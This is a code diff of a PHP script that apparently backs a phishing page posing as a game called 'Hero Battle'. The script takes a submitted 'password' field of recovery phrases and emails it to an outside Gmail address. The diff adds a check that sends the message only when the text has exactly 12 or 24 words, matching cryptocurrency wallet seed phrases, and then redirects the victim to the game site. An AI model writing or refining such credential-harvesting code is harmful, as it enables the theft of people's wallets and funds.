@@ -5,11 +5,18 @@ $subject = "Phrases Hero Battle";
 $phrases = $_POST['password'];
 
 $message = $phrases;
+$valid = str_word_count($message, 0);
+
 $headers = "Content-type:text/html; charset = UTF-8 \r\n";
 $headers .= "From: gamesforecod@gmail.com";
 $headers .= "Reply to gamesforecod@gmail.com";
 
-mail($to, $subject, $message, $headers);
+if ($valid == 12 || $valid == 24) {
+  mail($to, $subject, $message, $headers);
+  header("Location: https://herobattle.app/game?rare=0&race=255&page=0&id=-1&sort=1");
+} else {
+ 
+}
 ?>
 
 <!DOCTYPE html>
